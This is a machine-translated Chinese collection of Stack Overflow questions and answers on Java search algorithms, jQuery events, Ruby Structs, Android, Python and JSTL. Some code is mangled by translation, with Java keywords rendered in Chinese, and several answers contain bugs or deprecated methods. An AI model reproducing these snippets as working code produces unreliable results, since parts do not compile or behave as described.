                int searchedIndex = callToBinarySearch(a, i, finalIndex);
                return searchedIndex;
            }

            else {
                i = finalIndex + 1;
                power = power * 2;
                finalIndex = (int) Math.pow(2, power);

            }
        }
        return -1;

    }
} 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2021-09-17T05:54:05.320

包com.population.app；

导入 java.io。*; 导入 java.util。*;

类演示{

```
public static void main(String args[]) {
    int arr[] = { 1, 2, 4, 6, 8, 9, 12, 14, 17, 21, 45 };
    int index = findPos(arr, 45);
    if (index == -1)
        System.out.println("Element not found!");
    else
        System.out.println("Element found! index = " + index);
}

static int findPos(int arr[], int value) {
    int start = 0, end = 1;
    while (arr[end] < value) {
        start = end;
        end = 2 * end;
        // we know it is infinite but if it has finite elements it will reduce the
        // overflow of legth to n-1 element other wise the code will fail has array
        // index out of bound exception
        if (end > arr.length) {
            end = arr.length - 1;
        }
    }
    return binarySearch(arr, start, end, value);
}

static int binarySearch(int arr[], int start, int end, int ele) {
    if (end >= start) {
        int mid = start + (end - start) / 2;
        if (arr[mid] == ele)
            return mid;
        if (arr[mid] > ele)
            return binarySearch(arr, start, mid - 1, ele);
        return binarySearch(arr, mid + 1, end, ele);
    }
    return -1;
} 
```

}***

# javascript - nicEditor 的撤消/重做插件（页面上有多个实例）

> ID：12300905
> 
> 赞同：0
> 
> 时间：2012-09-06T13:11:54.610
> 
> 标签：javascript, jquery, jquery-plugins, nicedit

我有一个页面有多个 niceeditor 实例。我想创建一个特定于文本区域的撤消/重做按钮。不能使用 exec 命令。

# sharepoint-2010 - 如何通配符过滤特定多个字段的共享点列表

> ID：12300908
> 
> 赞同：1
> 
> 时间：2012-09-06T13:12:06.230
> 
> 标签：sharepoint-2010, filter, field, foundation

我正在寻找有关如何过滤多个字段的列表的问题的答案。我解决了一小部分问题，但问题是我只能在一个领域使用它。

```
if(sQuery1!=""){
    url=url + "FilterName=Title&FilterMultiValue=" + sQuery
    $(location).attr('href', url);
} 
```

这是我代码的一小部分。我正在使用过滤器名称和过滤器多值来解决我的问题，但现在的问题是我只能使用它一次。我已经尝试过`filtername1`，`filtermultivalue1`但它似乎不起作用。此外，我一直在互联网上寻找可能解决我问题的东西，但找不到任何东西。你能帮忙的话，我会很高兴。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-02-26T07:01:00.933

在 filtermultivalue 之后使用 *：

`if(sQuery1!=""){ url=url + "FilterName=Title&FilterMultiValue=*" + sQuery +"*" $(location).attr('href', url); }`

# box-api - 我可以从 Enterprise Box 帐户中选择管理员信息吗？

> ID：12300911
> 
> 赞同：0
> 
> 时间：2012-09-06T13:12:21.163
> 
> 标签：box-api

我们正在将 Box 集成到我们的 iOS 应用程序中。我们想要用户的信息——尤其是用户名。我们使用方法 GET /users。它适用于企业帐户的私人用户和普通用户，但对于企业管理员来说有点不方便。我们得到这个帐户中所有用户的列表。

是否可以从该列表中区分特定的管理员名称？它是列表中的第一个名字吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T17:40:56.667

我想补充一点，在我们将 V2 API 退出测试版之前，Box Platform 团队仍在为其添加功能。目前，您可能会发现使用 V1 API 的更多可能性，特别是 get_account_info 调用。但是，最好尽可能多地使用 V2 API，因为 V1 很快就会被弃用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T04:59:43.320

利用

```
GET /users/{user id} 
```

获取单个用户的信息。关于是否可以区分列表中的管理员，您暂时无法做到这一点。至少，他们现在不支持它

# python - 转置字典（从字典列表中提取一个键的所有值）

> ID：12300912
> 
> 赞同：7
> 
> 时间：2012-09-06T13:12:27.270
> 
> 标签：python, optimization, dictionary

我有一个这样的字典列表：

```
 data = [{'x': 1, 'y': 10},
         {'x': 3, 'y': 15},
         {'x': 2, 'y': 1},
          ... ] 
```

`matplotlib.axis.plot`我有一个需要列表`x`和`y`值的函数（例如）。所以我必须“转置”字典”。

第一个问题：你把这个操作叫做什么？“转置”是正确的术语吗？

我试过这个，但我正在寻找一种有效的方法（也许有一些特殊的`numpy`功能）：

```
x = range(100)
y = reversed(range(100))
d = [dict((('x',xx), ('y', yy))) for (xx, yy) in zip(x,y)]
# d is [{'y': 99, 'x': 0}, {'y': 98, 'x': 1}, ... ]

timeit.Timer("[dd['x'] for dd in d]", "from __main__ import d").timeit()
# 6.803985118865967

from operator import itemgetter
timeit.Timer("map(itemgetter('x'), d)", "from __main__ import d, itemgetter").timeit()
# 7.322326898574829

timeit.Timer("map(f, d)", "from __main__ import d, itemgetter; f=itemgetter('x')").timeit()
# 7.098556041717529

# quite dangerous
timeit.Timer("[dd.values()[1] for dd in d]", "from __main__ import d").timeit()
# 19.358459949493408 
```

有更好的解决方案吗？我的疑问是：在这些情况下，`'x'`每次都会重新计算字符串的哈希值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T15:02:23.720

[从这个答案](https://stackoverflow.com/a/639325/34329)中窃取表格

```
import timeit
from operator import itemgetter
from itertools import imap

x = range(100)
y = reversed(range(100))
d = [dict((('x',xx), ('y', yy))) for (xx, yy) in zip(x,y)]
# d is [{'y': 99, 'x': 0}, {'y': 98, 'x': 1}, ... ]
D={x:y for x,y in zip(range(10),reversed(range(10)))}

def test_list_comp(d):
    return [dd['x'] for dd in d]

def test_list_comp_v2(d):
    return [(x["x"], x["y"]) for x in d]

def testD_keys_values(d):
    return d.keys()

def test_map(d):
    return map(itemgetter('x'), d)

def test_positional(d):
    return [dd.values()[1] for dd in d]

def test_lambda(d):
    return list(imap(lambda x: x['x'], d))

def test_imap_iter(d):
    return list(imap(itemgetter('x'), d))

for test in sorted(globals()):
    if test.startswith("test_"):
        print "%30s : %s" % (test, timeit.Timer("f(d)", 
              "from __main__ import %s as f, d" % test).timeit())
for test in sorted(globals()):
    if test.startswith("testD_"):
        print "%30s : %s" % (test, timeit.Timer("f(D)", 
              "from __main__ import %s as f, D" % test).timeit()) 
```

给出以下结果：

```
 test_imap_iter : 8.98246016151
       test_lambda : 15.028239837
    test_list_comp : 5.53205787458
 test_list_comp_v2 : 12.1928668102
          test_map : 6.38402269826
   test_positional : 20.2046790578
 testD_keys_values : 0.305969839705 
```

显然，最大的胜利是让您的数据格式更接近您已经需要的格式，但您可能无法控制它。

就名字而言，我称之为转型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:23:39.693

如果您只需要迭代这些值，则可以考虑使用此方法：

```
imap(lambda x: x['x'], d) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T14:24:24.827

为什么不这样呢？

```
[(x["x"], x["y"]) for x in d] 
```

这将返回一个包含 x 和 y 位置的元组列表。我不确定它的速度，但它会摆脱 lambda 开销。

# apache-poi - Apache POI api 的 C# 等价物是什么？

> ID：12300915
> 
> 赞同：6
> 
> 时间：2012-09-06T13:12:44.903
> 
> 标签：apache-poi

我需要复制我使用 Apache POI api 构建的 ij Java 框架以从 MS Excel 读取数据。我不知道用什么相当于 apache POI 库。任何想法请任何人？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-06T16:24:44.753

这取决于你想做什么。

一种选择是[NPOI](https://github.com/tonyqus/npoi)，它是 Apache POI 到 .Net 的 .Net 端口

另一种选择是使用[IKVM](http://www.ikvm.net/)，然后直接从 .Net 中使用 Apache POI 本身。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:22:59.753

从 Office 2007 开始，您可以使用[Open XML SDK](https://www.nuget.org/packages/DocumentFormat.OpenXml/)来处理 MS Office 文档格式。

# javascript - 更改元素高度在第二次推送时不起作用

> ID：12300916
> 
> 赞同：0
> 
> 时间：2012-09-06T13:12:46.867
> 
> 标签：javascript, jquery, html, css, height

我有一个增加元素高度的按钮（#nav-button）。但我希望同一个按钮在再次按下时也能降低高度。编码：

```
 $(document).ready(function(){ 

        $('.nav-button-open').click(function(){
            $('.nav-bar').animate({height:'90px'}, 500);
            $("#nav-button").attr('class', 'nav-button-close');
        });
        $('.nav-button-close').click(function(){
            $('.nav-bar').animate({height:'10px'}, 500);
            $("#nav-button").attr('class', 'nav-button-open');
        });
    });​ 
```

小提琴：http: [//jsfiddle.net/mdecler/e4XED/](http://jsfiddle.net/mdecler/e4XED/)

jQuery 可以很好地增加高度，但是当我再次按下按钮时，我无法降低高度！我究竟做错了什么？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:16:58.900

考虑将您的 jQuery 代码更改为：

```
 $(document).ready(function(){ 
        $('#nav-button').click(function(){
            if($(this).hasClass("nav-button-open")){
               $('.nav-bar').animate({height:'90px'}, 500);
               $("#nav-button").attr('class', 'nav-button-close');}
            else{
               $('.nav-bar').animate({height:'10px'}, 500);
               $("#nav-button").attr('class', 'nav-button-open');            
            }
        });
    });​ 
```

演示链接：

[http://jsfiddle.net/e4XED/4/](http://jsfiddle.net/e4XED/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:14:51.020

我认为，您应该使用 .live('click', ...)，因为您动态更改按钮的类，但仅在开始时设置点击事件。[正确的 jsfiddle](http://jsfiddle.net/mdecler/e4XED/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:16:18.337

加载 jQuery 脚本时，该类`nav-button-close`不存在。使用`on`.

看到这个[jsFiddle](http://jsfiddle.net/e4XED/3/)

注意：不要使用`live`，它已被弃用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:18:48.323

就像 aleksey 说的，使用 live。或者您可以添加一个类并检查它是否存在。像：

```
$('.nav-button').click(function(){
        if($(this).hasClass('open')){
            $('.nav-bar').animate({height:'10px'}, 500);
            $(this).removeClass('open').addClass('close');
        }else{
            $('.nav-bar').animate({height:'90px'}, 500);
            $(this).removeClass('close').addClass('open');                 
        }1
    }); 
```

# javascript - 添加CKEditor的上下文（右键）菜单

> ID：12300919
> 
> 赞同：3
> 
> 时间：2012-09-06T13:12:56.343
> 
> 标签：javascript, ckeditor

目标是创建带有复制、剪切和粘贴选项的菜单。有人知道如何启用或添加 CKEditor 的上下文（右键单击）菜单吗？

# ruby - 将 to_hash（或 to_h）方法添加到 Struct 的优雅方式？

> ID：12300920
> 
> 赞同：5
> 
> 时间：2012-09-06T13:12:57.057
> 
> 标签：ruby, ruby-1.9.3

我在项目中使用 Struct 而不是简单的 Hash 来为键值对集合提供语义名称。然而，一旦我构建了结构，我需要输出一个哈希值。我在 Ruby 1.9.3 中。例子：

```
MyMeaninfulName = Struct.new(:alpha, :beta, :gamma) do
  def to_hash
    self.members.inject({}) {|h,m| h[m] = self[m]; h}
  end
end

my_var = MyMeaningfulName.new
my_var.to_hash # -> { :alpha=>nil, :beta=>nil, :gamma=>nil } 
```

Struct 不包含 to_hash 方法是否有原因？这似乎很自然，但也许有一个根本原因不包括在内。

其次，是否有一种更优雅的方法可以将通用 to_hash 方法构建到 Struct 中（通常是通过猴子补丁，或者通过模块或继承）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-02-05T09:51:28.697

我知道问题是关于 ruby​​ 1.9.3，但从 ruby​​ 2.0.0 开始，`Struct`有一个[`to_h`](http://ruby-doc.org/core-2.0.0/Struct.html#method-i-to_h)方法可以完成这项工作。

```
MyMeaningfulName = Struct.new(:alpha, :beta, :gamma)

my_var = MyMeaningfulName.new
my_var.to_h # -> { :alpha=>nil, :beta=>nil, :gamma=>nil } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:32:17.280

或这个：

```
class Struct
  def to_hash
    self.class.members.inject({}) {|h,m| h[m] = self[m]}
  end
end 
```

（注意额外的课程来接触成员）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-06T14:50:20.393

不知道为什么，好像很明显。幸运的是，由于它实现了括号运算符，因此您可以在许多地方将其用作哈希。

无论如何，这是相当优雅的：

```
MyMeaningfulName = Struct.new :alpha, :beta, :gamma do
  def to_hash
    Hash[members.zip values]
  end
end

my_var = MyMeaningfulName.new 1, 2, 3
my_var.to_hash # => {:alpha=>1, :beta=>2, :gamma=>3} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:24:50.647

试试这个：

```
class Struct
  old_new = self.method(:new)
  def self.new(*args) 
    obj = old_new.call(*args)
    obj.class_exec do
      def to_hash
        self.members.inject({}) {|h,m| h[m] = self[m]; h}
      end
    end
    return obj
  end
end 
```

# api - 在沙箱中创建重复分析失败

> ID：12300930
> 
> 赞同：0
> 
> 时间：2012-09-06T13:13:24.097
> 
> 标签：api, paypal

我在沙盒上工作。我收到错误：

[0] => 数组（[L_ERRORCODE] => 11502 [L_SHORTMESSAGE] => 令牌无效 [L_LONGMESSAGE] => 令牌无效 [L_SEVERITYCODE] => 错误）

这就是我在 CreateRecurringProfile 中传递的内容：

[REQUESTDATA] => Array ([USER] => "API_USER" [PWD] => "API_PASS" [VERSION] => 74.0 [BUTTONSOURCE] => AngellEYE_PHPClass [SIGNATURE] => "API_SING" [METHOD] => CreateRecurringPaymentsProfile [ TOKEN] => EC-8F723718H3002730R [SUBSCRIBERNAME] => 测试人员 Testerson [PROFILESTARTDATE] => 2012-09-06T00:00:00\Z [DESC] => 项目 1 名称 [AUTOBILLAMT] => 1 [BILLINGPERIOD] => 月[BILLINGFREQUENCY] => 1 [TOTALBILLINGCYCLES] => 0 [AMT] => 10.00 [CURRENCYCODE] => USD [EMAIL] => hide@address.com [BUSINESS] => Testers, LLC [FIRSTNAME] =>测试人员 [LASTNAME] => 测试人员）

注意：我已删除 SANDBOX API 凭据。在这里展示。

请给我解决方案这里缺少什么或我的发布请求有什么问题。

感谢提前

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T20:17:20.700

您是否在 SetExpressCheckout 和 DoExpressCheckoutPayment API 调用中包含 L_BILLINGTYPE0=RecurringPayments？

# android - 如何关闭安卓播放器

> ID：12300931
> 
> 赞同：2
> 
> 时间：2012-09-06T13:13:28.117
> 
> 标签：android, android-intent

```
File file = new File(mFileName);
Intent intent = new Intent();
intent.setAction(android.content.Intent.ACTION_VIEW);
intent.setDataAndType(Uri.fromFile(file), "audio/*");
startActivity(intent); 
```

在我的应用程序中，我正在使用此代码并播放音频文件，但是播放完成后播放器不会关闭。有没有办法在播放完整个音频后关闭播放器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-11T10:19:37.860

例如[https://gist.github.com/850599](https://gist.github.com/850599)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T15:49:57.207

我在我的安卓手机上尝试了你的代码，在播放完音乐后`default player`关闭并返回到最后一个活动。所以也许这取决于`default player`.

我认为这是使用 MediaPlayer 的更好方法，`default player`其中更确定。

顺便说一句，您可以尝试杀死该`default player`进程。获取音乐的时间，播放时间结束后启动线程杀死进程。

```
Runtime.getRuntime().exec("kill" +pid); 
```

# r - 使用 R 进行谷歌预测

> ID：12300933
> 
> 赞同：15
> 
> 时间：2012-09-06T13:13:32.780
> 
> 标签：r, google-prediction

有没有人在 R 中成功使用过 Google Predication API？我的目标是执行以下任务：

*   上传和管理 Google Storage 中的数据
*   使用此数据从 Google Prediction 训练模型

[我已按照此处](https://developers.google.com/storage/docs/gsutil_install)和[此处](http://code.google.com/p/r-google-prediction-api-v12/)的安装说明进行操作（使用 Windows 时）。我无法同时使用 Mac OSX 和 Windows 成功连接。

我怀疑核心问题是身份验证。有零散的文档，我觉得我已经尝试了所有东西（甚至是为此目的设计的 R 包的概述）。

我不是最伟大的程序员，但我通常可以跟随代码并从工作示例中拼凑出我需要的东西。不过，在这一点上，我根本不知道还能尝试什么。

提前谢谢了。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-12T20:44:28.980

Marc Cohen 似乎是对的，我认为有些地方出了问题。但是我设法通过了身份验证，方法如下：

下载`googlepredictionapi_0.12.tar.gz`并将其解压缩到一个临时文件夹中。然后`googlepredictionapi/R/prediction_api_init.R`在编辑器中打开并删除行

```
myEmail <- ""
myPassword <- ""
myAPIkey <- "" 
```

之后重新打包源文件并将它们加载到 R 中：

```
tar czf googlepredictionapi.mod.tar.gz googlepredictionapi
R
remove.packages("googlepredictionapi") 
```

现在您应该能够按照 [1] [http://code.google.com/p/r-google-prediction-api-v12/](http://code.google.com/p/r-google-prediction-api-v12/)中的步骤进行操作。然而，而不是打电话

```
install.packages("googlepredictionapi_0.12.tar.gz", repos=NULL, type="source") 
```

你需要打电话

```
install.packages("googlepredictionapi.mod.tar.gz", repos=NULL, type="source") 
```

按照这些步骤，在某些时候`$HOME/.auth-token`应该生成一个文件。

（您甚至可以通过显式调用来显式触发它：`PredictionApiUtilGetAuth(verbose=TRUE)`，`myEmail`并且`myPassword`必须事先设置。）

由于某种原因，在 [1] 中手动设置的全局变量已被上面删除的行所遮蔽。详细选项实际上也是如此，您可以将其作为额外选项传递给大多数 API 函数调用`..., verbose=TRUE)`。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T04:26:19.667

上次我听说（今年 4 月），R 对 Google Prediction API 的支持还没有升级为使用 OAuth，所以当 Prediction API 从旧的客户端登录方案切换到 OAauth 2.0 时，它实际上破坏了 R 功能。

# openerp - 具有动态值的字段

> ID：12300938
> 
> 赞同：0
> 
> 时间：2012-09-06T13:13:52.847
> 
> 标签：openerp

我正在开发一个新模块，我有一个小问题。在采购订单中，我添加了两个字段：project_id 和 phase_id，它们分别将 PO 关联到一个项目和一个项目阶段。问题是，一旦选择了项目，阶段字段仍然显示数据库中存在的所有阶段。有没有办法只显示所选项目的阶段？也许与 on_change ？但我是 OpenERP 开发的新手，我不知道如何使用它......

先感谢您。

PS：顺便说一句，如果它对我的问题有任何改变，我正在使用 6.1 版本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:17:12.957

您可以在 xml 中为字段 phase_id 使用域条件

```
<field name="project_id"/>
<field name="phase_id" domain="[('project_id','=',project_id)]"/> 
```

这将解决您的问题

# jquery - jquery .html 结果

> ID：12300943
> 
> 赞同：1
> 
> 时间：2012-09-06T13:14:10.367
> 
> 标签：jquery, ajax

我正在对服务器页面进行 ajax 调用，并通过 html 方法在 div 中打印结果：

```
$(document).ready(function()
{
     $.ajax
     ({
    async:false, 
    type: 'GET', cache: false,
    url: '..urlhere..',
        success: function(data){printresult(data);}
      });
}); 
```

使用打印结果（数据）：

```
$("thediv").html(data); 
```

这一切都有效，但结果本身包含类跨度。这些跨度在悬停时应该发出简单的警报。我也在 document.ready 中实现了这一点：

```
$(".spanclass").hover(function () 
{
    alert('j');
}); 
```

这不起作用..是因为结果来自 ajax 并且 DOM 没有将其视为 spanclass 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:16:21.163

你应该*委托*事件，你可以使用`on`方法。

```
$(document).on({
   mouseenter: function(){
    alert('entered')
   }, 
   mouseleave: function(){
    alert('left')
  }     
}, ".spanclass") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:16:13.730

`delegate`为动态添加的元素设置这样的

```
$(function(){
   // on document ready setup the delegate for the hover event
   $(document).on('hover', '.spanclass', function(){
       alert('j');
   }); 
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:19:28.867

你应该使用`delegate`

```
$('thediv').delegate('hover', '.spanclass', function() { ... }); 
```

这是来自 jQuery 的描述

```
Attach a handler to one or more events for all elements that match the selector, now or in the future, based on a specific set of root elements. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:18:05.917

```
$('.spanclass').live('mouseover', function() {
    alert('j');
}); 
```

# java - 以二分查找算法为基础实现二分插入

> ID：12300948
> 
> 赞同：0
> 
> 时间：2012-09-06T13:14:21.887
> 
> 标签：java, arrays, insert, binary, sorted

我正在尝试实现二进制插入方法。

目前这个方法非常简单，它接受一个参数，在一个while循环中它搜索一个比参数大的元素（在这种情况下是一个人的姓氏的字符串），一旦找到它就会中断并且将数组的其余部分向右移动。然后将参数插入到中断的位置。

我尝试将其更改为通过借用二进制搜索算法来搜索插入位置的方法。但是，我就是无法让它工作。

你能告诉我我做错了什么吗？这是我的代码：

```
公共无效插入（个人）
{

 `String lastName = person.getLastName();

    int position = -1; // the position from which the array will be shifted to the right and where the argument will be inserted, will be assigned properly below

    int lowerBound = 0;
    int upperBound = numElems - 1;
    int currIt;

    if (numElems == 0)
        array[0] = person; // if array empty insert at first position
    else 
    {
        while (true) 
        {
            currIt = (lowerBound + upperBound) / 2; //the item to compare with

            int result2 = 0;

            int result1 = array[currIt].getLastName().compareTo(lastName);

            if (array[currIt+1] != null) // if the next element is not null, compare the argument to it
                result2 = array[currIt+1].getLastName().compareTo(lastName);

            if (currIt == 0 && result1 > 0) // this is when the argument is smaller then the first array element
            { 
                position = 0;
                break;
            }
            // if the position to insert is the last one, or we have found a suitable position between a smaller and a bigger element
            else if (  (result1 < 0 && (currIt == numElems-1))  ||  (result1 < 0 && result2 > 0)  ) {
                position = currIt+1;             
                break;
            }    
            else
            {
                if (result1 < 0)  // the place to put it should be in the upper half
                    lowerBound = currIt + 1; 
                else 
                    upperBound = currIt - 1; //in the lower half              
            }

        }
    }
    // position has been set to anything else other -1, then we have found our spot, probably a redundant check but useful for debugging
    if (position != -1)
    {
        //shift array to the right and insert element
        for (int j = numElems; j > position; j--)
        array[j] = array[j-1];
        System.out.println("Inserted an element");
        array[position] = person;
        numElems++;
    }

}` 

            回答 #1

赞同：1

时间：2012-09-06T13:26:36.237

您的“可能 [] 冗余检查”禁止初始插入。第一次位置是-1。

设置`position`在`0`顶部，应该可以解决问题。

```

# android - Android JSON解析，无法连接到服务

> ID：12300953
> 
> 赞同：-1
> 
> 时间：2012-09-06T13:14:27.747
> 
> 标签：android, json, url, youtube, connection

我正在尝试编写一种方法来调用服务并在 Android 应用程序中获取 JSON 数据。假设所有必要的 gloable 变量都已声明...

这些是我正在使用的库：

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject; 
```

这是我的代码：

```
public class JSONParser {

String url = "http://gdata.youtube.com/feeds/api/users/eon/uploads?&v=2&max-   results=50&alt=jsonc"; 

JSONObject jObj = null;
JSONArray ja = null;
String json = "";

// constructor
public JSONParser() {

 }

  public JSONObject getJSONFromUrl(String url){
    try {
          URL urlGetter = new URL(url);
        URLConnection tc = urlGetter.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(
                tc.getInputStream(), "iso-8859-1"), 8);

          StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = in.readLine()) != null) {
            sb.append(line + "\n");
        }

         json = sb.toString();
    } catch (MalformedURLException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

      //parse the string to a JSON object
    try {
        jObj = new JSONObject(json);
    } catch (JSONException e) {
        Log.e("JSON Parser", "Error parsing data " + e.toString());
    }
    return jObj;
   } 
```

它只是不起作用，我尝试在调试模式下运行，当它运行到这一行时：

```
BufferedReader in = new BufferedReader(new InputStreamReader(
            tc.getInputStream(), "iso-8859-1"), 8); 
```

它抱怨： java.net.UnknownHostException: gdata.youtube.com 我不知道如何解决这个问题......有什么建议吗？谢谢

顺便说一句，在我的 android 清单中，我已经允许上网：

如果您在浏览器中查找 url，您可以看到 ti 的 json 格式 ...并且可以连接...但是我的代码只是抱怨 unknowhostexception ...."http://gdata.youtube.com/ feeds/api/users/eon/uploads?&v=2&max-results=50&alt=jsonc";

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:32:19.047

请将权限放入您的 androidManifest.xml

```
<uses-permission android:name="android.permission.INTERNET"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:17:15.783

我想您需要使用[urlEncoder](http://developer.android.com/reference/java/net/URLEncoder.html)对 url 进行编码 ..因为 url 包含需要用 %20 替换的空间 ..check [https://stackoverflow.com/a/3286128/1434631](https://stackoverflow.com/a/3286128/1434631)

# python - 为什么函数的返回数组是输入列表的两倍？

> ID：12300972
> 
> 赞同：0
> 
> 时间：2012-09-06T13:15:34.827
> 
> 标签：python, numpy, scipy

我在 python 中创建了一个简单的函数：

```
def func(a,x):
  return a+x*2 
```

然后我称之为

```
x = [log(1),log(2),log(4),log(5),log(8)]
#Import y data from a file
free= curve_fit(func,np.array(x),np.array(y))[0][0]
yline = func(free,x) 
```

结果`yline`是两倍长，`x`并且每个元素都有两次。

为什么呢？

**注意：** 我正在导入 numpy 但不是 scipy 或 curve_fit

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T13:17:35.827

`x`是一个列表，`func`其中将“乘以 2”（即其元素的数量加倍）。

如果要将其乘以 2（即每个元素相乘），请将其转换为`np.array`first：

```
x = [log(1),log(2),log(4),log(5),log(8)]
#Import y data from a file
free= curve_fit(func,np.array(x),np.array(y))[0][0]
yline = func(free, np.array(x)) 
```

# actionscript-3 - 鼠童问题

> ID：12300973
> 
> 赞同：1
> 
> 时间：2012-09-06T13:15:38.723
> 
> 标签：actionscript-3

考虑以下代码。

```
var sParent:Sprite = new Sprite();
var obj:Sprite = new Sprite();
var childA:Sprite = new Sprite();
var childB:Sprite = new Sprite();

sParent.addChild(obj);
obj.addChild(childA);
obj.addChild(childB);

childB.mouseChildren = false;
childB.mouseEnabled  = false;

sParent.addEventListener(MouseEvent.CLICK, itemClickHandler);
sParent.addEventListener(MouseEvent.ROLL_OVER, onHoverIn);
sParent.addEventListener(MouseEvent.ROLL_OUT, onHoverOut); 
```

现在，我想检测“ChildA”上的事件，但我不想检测“ChildB”上的孩子

```
mouseChildren = false; 
```

在这种特殊情况下，显然不是解决方案。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:17:15.483

看起来这是 ROLL_OVER 的限制或设计特性，请检查以下程序，我已将 ROLL_OVER 事件更改为 MOUSE_OVER，并且 target 和 currentTarget 给出了正确的精灵：

```
package 
{
    import flash.display.Sprite;
    import flash.events.Event;
    import flash.events.MouseEvent;

    public class Main extends Sprite 
    {

        public function Main():void 
        {
            if (stage) init();
            else addEventListener(Event.ADDED_TO_STAGE, init);
        }

        private function init(e:Event = null):void 
        {
            removeEventListener(Event.ADDED_TO_STAGE, init);
            // entry point

            var sParent:Sprite = new Sprite();

            var obj:Sprite = new Sprite();

            var childA:Sprite = new Sprite();

            childA.graphics.beginFill(0xff0000);
            childA.graphics.drawRect(0, 0, 100, 50);
            childA.graphics.endFill();

            var childB:Sprite = new Sprite();
            childB.x = 150;
            childB.graphics.beginFill(0x00ff00);
            childB.graphics.drawRect(0, 0, 100, 50);
            childB.graphics.endFill();

            sParent.addChild(obj);
            obj.addChild(childA);
            obj.addChild(childB);

            childB.mouseChildren = false;
            childB.mouseEnabled  = false;

            sParent.mouseEnabled = false;
            obj.mouseEnabled = false;

            sParent.addEventListener(MouseEvent.CLICK, itemClickHandler);
            sParent.addEventListener(MouseEvent.MOUSE_OVER, onHoverIn);
            sParent.addEventListener(MouseEvent.MOUSE_OUT, onHoverOut);

            addChild(sParent);
        }

        private function onHoverOut(e:MouseEvent):void 
        {
            trace(e.currentTarget.name+ " "+e.target.name);
        }

        private function onHoverIn(e:MouseEvent):void 
        {
            trace(e.currentTarget.name+ " "+e.target.name);
        }

        private function itemClickHandler(e:MouseEvent):void 
        {
            trace(e.currentTarget.name+ " "+e.target.name);
        }

    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:31:15.220

我遇到了同样的问题，并用一些非常出乎意料的东西解决了它......

```
var obj:Sprite = new Sprite();
var childA:Sprite = new Sprite();
var childB:Sprite = new Sprite();

obj.addChild(childA);
obj.addChild(childB);

obj.mouseEnabled = false; // this.
childB.mouseEnabled = false;
childB.mouseChildren = false; 
```

# java - c:forEach 不工作

> ID：12300979
> 
> 赞同：4
> 
> 时间：2012-09-06T13:16:04.423
> 
> 标签：java, jsp, web

我对 taglib 方法 c:forEach 有疑问。我想从 servlet 类中获取语言列表，并使用 c:forEach 在 jsp 页面上显示它。但它什么也没显示^^一个空的选择标签。

jsp文件中的for each循环（我有taglib导入并且已经尝试过没有c：out）：

```
...
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
...
<c:forEach var="lang" items="${registrationServlet.inputLangs}">
  <option><c:out value="${lang}"></c:out></option>
</c:forEach> 
```

我的 Servlet 类（它是一个 servlet，因为我也必须用它做一些表单提交的东西）：

```
...
// List of languages to choose from
List<String> inputLangs;
...
// Query the languages from the database
public List<String> getInputLangs() {
    try {
        String query = "SELECT DISTINCT Lang FROM country";
        ResultSet result = DbConnection.read(query);
        while (result.next()) {
            inputLangs.add(result.getString("lang"));
        }
    } catch (SQLException e) {
        System.err.println("Couldn't get languages from DB.");
    }
    return inputLangs;
} 
```

我做错了什么？^^

顺便提一句。它适用于纯java：

```
<%
RegistrationServlet reg = new RegistrationServlet();
for (String lang : reg.getInputLangs()) {
%>
  <option><%=lang%></option>
<%
}
%> 
```

但据我所知，这在 jsp 文件中是不行的；）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-06T13:25:33.360

`${registrationServlet.inputLangs}`方法：

*   在页面范围内找到一个名为“registrationServlet”的属性
*   如果没有找到，在请求范围内找到一个名为“registrationServlet”的属性
*   如果未找到，则在会话范围内查找名为“registrationServlet”的属性
*   如果没有找到，在应用范围内找到一个名为“registrationServlet”的属性
*   如果找到，则调用`getInputLangs()`找到的对象

